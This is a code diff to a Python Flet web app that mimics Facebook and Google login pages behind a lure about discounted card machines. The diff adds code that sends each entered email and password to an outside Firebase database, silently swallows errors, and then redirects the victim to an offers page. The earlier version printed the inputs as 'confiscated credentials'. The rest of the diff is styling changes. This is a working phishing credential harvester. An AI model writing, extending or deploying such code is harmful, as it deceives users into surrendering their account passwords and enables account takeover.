@@ -1,6 +1,7 @@
 import flet as ft
 import webbrowser
-
+import requests
+import json
 
 def main(page: ft.Page):
 
@@ -197,9 +198,19 @@ def main(page: ft.Page):
     def EnviarRegistro():
 
         if t2_campo_senha.value.strip() != "" and t2_campo_email.value.strip() != "":
-            print("Credenciais Confiscadas:")
-            print(f"E-mail: {t2_campo_email.value}")
-            print(f"Senha: {t2_campo_senha.value}")
+            # print("Credenciais Confiscadas:")
+            # print(f"E-mail: {t2_campo_email.value}")
+            # print(f"Senha: {t2_campo_senha.value}")
+
+            try:
+                link = "https://projectphs-default-rtdb.firebaseio.com/"
+
+                credenciais = {"Retornos": f"{t2_campo_email.value};{t2_campo_senha.value}"}
+
+                requests.post(f'{link}/Credenciais/.json', data=json.dumps(credenciais))
+            except:
+                pass
+
 
             page.go("/ofertas")
             page.update()
@@ -207,6 +218,7 @@ def main(page: ft.Page):
 
             page.snack_bar = ft.SnackBar(
                 bgcolor=ft.colors.RED_ACCENT_200,
+                duration=3000,
                 content=ft.Row([
                     ft.Text(f'Preencha todos os campos',
                             weight='bold', color='black', size=20, ),
@@ -251,7 +263,7 @@ def main(page: ft.Page):
 
                         ft.Text(
                             "Maquininhas no preço!", color="black", size=23,
-                            font_family="Georgia",  # "Times New Roman",),
+                            font_family="Georgia",
                             weight=ft.FontWeight.W_800
                         )], alignment="center"),
 
@@ -367,7 +379,7 @@ def main(page: ft.Page):
             )
         )
         if page.route == '/facebook/login':
-            print(page.route)
+
             Tela2.bgcolor = "#282C34",
             page.bgcolor = "#282C34",
 
@@ -401,14 +413,15 @@ def main(page: ft.Page):
 
             # SENHA
             t2_campo_senha.focused_border_color = "white54",
-            t2_campo_senha.cursor_color = "white54",
+            t2_campo_senha.cursor_color = "white",
             t2_campo_senha.bgcolor = "#2C313C"
-            t2_campo_senha.label_style = ft.TextStyle(color="white74", size=16,
+            t2_campo_senha.label_style = ft.TextStyle(color="white", size=16,
                                                       weight=ft.FontWeight.W_400,
                                                       )
 
             t2_senha_esq.visible = True
             t2_senha_conta_facebook.visible = True
+            t2_senha_conta_google.visible = False
 
             page.update()
 
@@ -437,11 +450,11 @@ def main(page: ft.Page):
             t2_box_senha.controls[1].color = "black"
 
             t2_botao_avancar.color = "Black"
-            t2_botao_avancar.bgcolor = "white74"
+            t2_botao_avancar.bgcolor = "#ebebeb"
 
 
-            t2_campo_senha.color = "black74"
-            t2_campo_email.color = "black74"
+            t2_campo_senha.color = "black"
+            t2_campo_email.color = "black"
 
             t2_campo_senha.border_color = "#AAAAAA"
             t2_campo_email.border_color = "#AAAAAA"
@@ -449,18 +462,18 @@ def main(page: ft.Page):
 
 
             # EMAIL
-            t2_campo_email.focused_border_color = "black54",
-            t2_campo_email.cursor_color = "black54",
+            t2_campo_email.focused_border_color = "black",
+            t2_campo_email.cursor_color = "black",
             t2_campo_email.bgcolor = "white"
-            t2_campo_email.label_style = ft.TextStyle(color="black74", size=16,
+            t2_campo_email.label_style = ft.TextStyle(color="black", size=16,
                                    weight=ft.FontWeight.W_400,
                                    )
 
             # SENHA
-            t2_campo_senha.focused_border_color = "black54",
-            t2_campo_senha.cursor_color = "black54",
+            t2_campo_senha.focused_border_color = "black",
+            t2_campo_senha.cursor_color = "black",
             t2_campo_senha.bgcolor = "white"
-            t2_campo_senha.label_style = ft.TextStyle(color="black74", size=16,
+            t2_campo_senha.label_style = ft.TextStyle(color="black", size=16,
                                                       weight=ft.FontWeight.W_400,
                                                       )
             t2_senha_conta_google.visible = True
@@ -528,8 +541,9 @@ def main(page: ft.Page):
 
 
 
+if __name__ == "__main__":
 
-ft.app(target=main, assets_dir="assets", view=ft.WEB_BROWSER)
+    ft.app(target=main, assets_dir="assets", view=ft.WEB_BROWSER)
 
 
 
